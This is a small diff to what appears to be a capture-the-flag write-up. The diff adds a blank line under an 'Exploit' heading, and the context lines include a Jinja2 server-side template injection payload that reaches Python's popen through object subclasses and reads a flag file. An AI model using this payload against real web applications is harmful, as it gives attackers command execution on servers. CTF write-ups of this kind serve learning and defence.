@@ -48,6 +48,7 @@ if __name__ == '__main__':
 :::
 
 ## Exploit
+
 ### Easy way
 {% raw %}
 payload: `{{[].__class__.__base__.__subclasses__()[132].__init__.__globals__['popen']("cat /th1s_15_fl4ggggggg").read()}}`
